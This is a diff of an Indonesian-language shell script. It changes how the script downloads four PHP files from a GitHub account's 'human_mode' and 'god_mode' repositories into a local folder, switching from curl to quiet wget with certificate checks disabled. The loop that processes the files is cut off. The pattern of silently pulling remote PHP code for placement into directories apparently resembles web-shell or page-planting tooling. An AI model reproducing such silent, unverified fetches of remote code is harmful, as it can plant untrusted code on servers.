@@ -11,10 +11,10 @@ echo Silahkan masukan nama folder:
 read varname
 echo Directory yg di tuju: $varname
 mkdir x
-curl -O x https://raw.githubusercontent.com/bangsawantimur/human_mode/main/content.php
-curl -O x https://raw.githubusercontent.com/bangsawantimur/human_mode/main/cok2.php
-curl -O x https://raw.githubusercontent.com/bangsawantimur/human_mode/main/revisi.php
-curl -O x https://raw.githubusercontent.com/bangsawantimur/god_mode/main/task.php
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/bangsawantimur/human_mode/main/content.php
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/bangsawantimur/human_mode/main/cok2.php
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/bangsawantimur/human_mode/main/revisi.php
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/bangsawantimur/god_mode/main/task.php
 
 for i in $(ls -l x/ |awk '{print $9}'|sed '/^$/d')
 do
